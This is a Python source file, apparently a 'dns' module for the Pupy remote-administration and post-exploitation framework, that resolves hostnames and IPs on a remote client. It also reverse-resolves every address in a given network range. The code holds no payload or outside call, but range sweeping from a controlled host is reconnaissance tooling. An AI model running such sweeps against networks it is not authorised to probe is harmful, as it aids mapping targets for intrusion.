# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
from pupylib.PupyOutput import Table, NewLine

from netaddr import IPNetwork, IPAddress
from netaddr.core import AddrFormatError

__class_name__="DNS"

@config(cat="admin")
class DNS(PupyModule):
    """ retrieve domain name from IP and vice versa """

    dependencies = ['pupyutils.dns']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="dns", description=cls.__doc__)
        cls.arg_parser.add_argument('targets', type=str, nargs='+', help='Domain name or IP address')

    def run(self, args):
        launch_dns_ip_resolver = self.client.remote('pupyutils.dns', 'launch_dns_ip_resolver')
        launch_reverse_ip_resolver = self.client.remote('pupyutils.dns', 'launch_reverse_ip_resolver', False)

        add_space = False

        for target in args.targets:
            if add_space:
                self.log(NewLine())

            try:
                address = str(IPAddress(target))
                self.log('Resolve IP: {}'.format(target))
                hostname = launch_reverse_ip_resolver(address)
                if hostname:
                    self.success('{}: {}'.format(address, hostname))
                else:
                    self.error('{}: Not found'.format(address))
                add_space = True
                continue
            except (ValueError, AddrFormatError):
                pass

            try:
                network = IPNetwork(target)
                objects = []
                self.log('Resolve Net: {} (size={})'.format(target, len(network)))
                for ip in network:
                    ip = str(ip)
                    rip = launch_reverse_ip_resolver(ip)
                    if rip:
                        objects.append({
                            'IP': ip,
                            'HOSTNAME': rip
                        })

                self.success(Table(objects, ['IP', 'HOSTNAME']))
                add_space = True
                continue

            except AddrFormatError:
                pass

            self.log('Resolve hostname: {}'.format(target))
            known = set()
            found = False

            for k,v in launch_dns_ip_resolver(target).iteritems():
                if v and not type(v) == str:
                    v = [x for x in v if x not in known]
                    for x in v:
                        known.add(x)
                elif v:
                    known.add(v)

                if not v:
                    continue

                self.success('{}: {}'.format(k, v if type(v) is str else ','.join(v)))
                found = True

            if not found:
                self.error('{}: Not found'.format(target))

            add_space = True
